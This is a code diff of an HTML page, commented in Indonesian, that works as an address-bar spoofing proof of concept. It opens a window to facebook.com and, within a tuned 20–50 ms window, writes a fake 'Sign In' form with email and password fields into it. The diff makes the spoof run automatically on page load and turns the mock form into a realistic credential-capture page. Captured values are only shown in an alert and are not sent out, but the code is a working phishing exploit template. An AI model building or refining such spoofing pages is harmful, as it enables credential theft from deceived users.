@@ -1,30 +1,43 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <button onclick="spoof()">Click to spoof</button>
-
     <script>
+      // Auto-run saat halaman dibuka
       function spoof() {
-        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.facebook.com:8080", "_blank");
+        // Buka jendela baru dengan domain target untuk spoof address bar
+        let win = window.open("https://www.facebook.com:80", "_blank");
 
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        // Injeksi konten palsu dengan delay kecil sebelum target termuat
         setTimeout(() => {
           try {
+            win.document.open();
             win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
+              <h1>This is not Google!</h1>
+              <p>Please sign in to continue</p>
+              <input placeholder="Email" /><br>
+              <input placeholder="Password" type="password" /><br>
+              <button onclick="
+                let u = document.querySelector('input[placeholder=Email]').value;
+                let p = document.querySelector('input[placeholder=Password]').value;
+                alert('Captured:\\nUsername: ' + u + '\\nPassword: ' + p);
+              ">Sign In</button>
+              <style>
+                body {
+                  font-family: sans-serif;
+                  padding: 20px;
+                  background: white;
+                }
+              </style>
             `);
             win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
+          } catch (err) {
+            console.warn("Likely blocked by browser:", err);
           }
-        }, 1);
+        }, 30); // timing penting (20–50ms ideal)
       }
+
+      // Jalankan otomatis saat halaman dimuat
+      spoof();
     </script>
   </body>
 </html>
